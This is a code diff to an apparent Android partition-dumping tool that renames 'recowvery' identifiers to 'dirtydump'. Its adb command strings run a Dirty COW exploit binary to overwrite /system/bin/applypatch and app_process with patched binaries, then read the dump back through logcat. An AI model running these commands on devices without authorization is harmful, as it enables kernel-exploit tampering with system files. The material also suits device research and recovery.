@@ -30,13 +30,13 @@ static long current_size = 0;
 /* Shorter regex is possible, but I prefer like that */
 
 /* Used to start writting binary file */
-static regex rs("^.+I recowvery: (\\*\\*\\* DUMP START \\*\\*\\*)\\s+");
+static regex rs("^.+I dirtydump: (\\*\\*\\* DUMP START \\*\\*\\*)\\s+");
 /* Used to match all data block, and populate <datalist> */
-static regex rl("^.+I recowvery: HEXDUMP = \\[([^\\]]+)\\];\\s+");
+static regex rl("^.+I dirtydump: HEXDUMP = \\[([^\\]]+)\\];\\s+");
 /* Used to end writting, and exit infinit loop */
-static regex rf("^.+I recowvery: (\\*\\*\\* DUMP END \\*\\*\\*)\\s+");
-/* Used to intercept error from <recowvery-applypatch> */
-static regex re("^.+I recowvery: (\\*\\*\\* DUMP ERROR \\*\\*\\*)\\s+");
+static regex rf("^.+I dirtydump: (\\*\\*\\* DUMP END \\*\\*\\*)\\s+");
+/* Used to intercept error from <dirtydump> */
+static regex re("^.+I dirtydump: (\\*\\*\\* DUMP ERROR \\*\\*\\*)\\s+");
 /* ADB cmd error */
 static regex radbe("^error:(.+)\\s+");
 
@@ -216,15 +216,14 @@ int init() {
             "***************\n"
          << endl;
 
-    string files[] = {"dirtycow", "recowvery-applypatch_boot",
-                      "recowvery-applypatch_recovery",
-                      "recowvery-app_process64", "recowvery-app_process32"};
+    string files[] = {"dirtycow", "dirtydump_boot", "dirtydump_recovery",
+                      "dirtydump-app_process64", "dirtydump-app_process32"};
     string cmdlist[] = {
         "adb shell chmod 0777 /data/local/tmp/dirtycow",
-        "adb shell chmod 0777 /data/local/tmp/recowvery-applypatch_boot",
-        "adb shell chmod 0777 /data/local/tmp/recowvery-applypatch_recovery",
-        "adb shell chmod 0777 /data/local/tmp/recowvery-app_process64",
-        "adb shell chmod 0777 /data/local/tmp/recowvery-app_process32"};
+        "adb shell chmod 0777 /data/local/tmp/dirtydump_boot",
+        "adb shell chmod 0777 /data/local/tmp/dirtydump_recovery",
+        "adb shell chmod 0777 /data/local/tmp/dirtydump-app_process64",
+        "adb shell chmod 0777 /data/local/tmp/dirtydump-app_process32"};
 
     /* Push files to the device */
     for (auto s : files) {
@@ -268,22 +267,22 @@ int exploit_run(int partition) {
     if (partition == BOOT)
         cmdlist[0].append(
             "adb shell /data/local/tmp/dirtycow /system/bin/applypatch "
-            "/data/local/tmp/recowvery-applypatch_boot");
+            "/data/local/tmp/dirtydump_boot");
     else if (partition == RECOVERY)
         cmdlist[0].append(
             "adb shell /data/local/tmp/dirtycow /system/bin/applypatch "
-            "/data/local/tmp/recowvery-applypatch_recovery");
+            "/data/local/tmp/dirtydump_recovery");
     else
         return -1;
 
     if (arch_type == ANDROID_64)
         cmdlist[1] =
             "adb shell /data/local/tmp/dirtycow /system/bin/app_process64 "
-            "/data/local/tmp/recowvery-app_process64";
+            "/data/local/tmp/dirtydump-app_process64";
     else if (arch_type == ANDROID_32)
         cmdlist[1] =
             "adb shell /data/local/tmp/dirtycow /system/bin/app_process32 "
-            "/data/local/tmp/recowvery-app_process32";
+            "/data/local/tmp/dirtydump-app_process32";
     else
         return -1;
 
@@ -323,7 +322,7 @@ int device_reboot() {
  */
 int logcat_convert_to_data(string line) {
     /*
-     * If an unexpected EOF from recowvery-applypatch or if no <pipe>...
+     * If an unexpected EOF from dirtydump or if no <pipe>...
      * We can't receive a null string, so break the loop, close fsout, and exit
      * the program.
      */
@@ -399,14 +398,13 @@ int logcat_convert_to_data(string line) {
 
         start_write = false;
         if (crash_number == 3) {
-            cout << std::string("* Too many tries, please check your < "
-                                "recowvery-applypatch.c > and try again.")
+            cout << std::string("* Too many tries, please check your dirtydump "
+                                "and try again.")
                  << std::endl;
             return -1;
         }
-        cout << std::string(
-                    "* Be patient, recowvery-applypatch will restart in a few "
-                    "minutes.")
+        cout << std::string("* Be patient, dirtydump will restart in a few "
+                            "minutes.")
              << std::endl;
         crash_number++;
     }
@@ -415,7 +413,7 @@ int logcat_convert_to_data(string line) {
 }
 
 /*
- * Run <adb logcat -s recowvery> and send line by line to
+ * Run <adb logcat -s dirtydump> and send line by line to
  * <logcat_convert_to_data> function
  */
 int logcat_read() {
@@ -423,11 +421,11 @@ int logcat_read() {
     int ret = 0;
 
     cout << "*********************************\n"
-            "**** adb logcat -s recowvery ****\n"
+            "**** adb logcat -s dirtydump ****\n"
             "*********************************\n"
          << endl;
 
-    FILE *fc = popen("adb logcat -s recowvery", "r");
+    FILE *fc = popen("adb logcat -s dirtydump", "r");
     if (fc) {
         while (fgets(buff, sizeof buff, fc) != NULL) {
             ret = logcat_convert_to_data(string(buff));
@@ -454,7 +452,7 @@ int logcat_read() {
         }
         fclose(fc);
     } else {
-        cerr << "Error running <adb logcat -s recowvery" << endl;
+        cerr << "Error running <adb logcat -s dirtydump" << endl;
         ret = -1;
     }
 
